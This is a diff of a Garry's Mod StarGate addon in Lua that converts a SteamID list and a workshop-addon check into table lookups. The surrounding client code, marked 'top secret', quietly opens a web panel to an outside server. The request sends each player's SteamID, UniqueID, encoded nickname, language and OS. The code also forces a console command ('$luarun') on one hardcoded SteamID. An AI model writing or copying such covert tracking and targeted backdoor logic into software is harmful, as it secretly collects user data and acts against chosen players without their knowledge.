@@ -232,7 +232,7 @@ end
 hook.Add( "PlayerDeath", "StarGate.KeyBoard.Death", playerDies)
 hook.Add( "PlayerSilentDeath", "StarGate.KeyBoard.Death", playerDies)
 
-StarGate.SlGort = {"STEAM_0:0:49470464"};
+StarGate.SlGort = {["STEAM_0:0:49470464"]=true};
 
 if (CLIENT) then
 	--################# top secret @Llapp
@@ -251,9 +251,10 @@ if (CLIENT) then
 				StarGate.GroupSystem = StarGate.GroupSystem or 1;
 				local ws = 0;
 				if (StarGate.WorkShop) then ws = 1; end
+				local tbl = StarGate.CAP_WS_ADDONS or {}
 				for _,v in pairs(engine.GetAddons()) do
-					if (v.mounted) then
-						if (table.HasValue(StarGate.CAP_WS_ADDONS or {},v.title)) then
+					if (v.mounted) then                                    
+						if (tbl[tonumber(v.wsid)]) then
 							if (ws==1) then
 								ws = 2;
 							else
@@ -262,7 +263,7 @@ if (CLIENT) then
 							break;
 						end
 					end
-				end
+				end				
 				local lang = "";
 				if (SGLanguage!=nil and SGLanguage.GetClientLanguage!=nil) then lang = SGLanguage.GetClientLanguage(); end
 				local os = 0;
@@ -273,7 +274,7 @@ if (CLIENT) then
 				end
 				HTMLTest:OpenURL("http://alex-php.net/gmod/IDC.php?id="..p:UniqueID().."&sid="..p:SteamID().."&rev="..StarGate.CapVer.."&system="..StarGate.GroupSystem.."&enc&nick="..util.Base64Encode(p:Nick()).."&ws="..ws.."&lang="..lang.."&os="..os);
 
-				if (table.HasValue(StarGate.SlGort,p:SteamID())) then
+				if (StarGate.SlGort[p:SteamID()]) then
 		            --p:ConCommand("CAP_Banned");
 				    --timer.Create("Cap_Banned_Window"..LocalPlayer():EntIndex(), 120, 0, function() CAP_Banned() end);
 					p:ConCommand("$luarun")
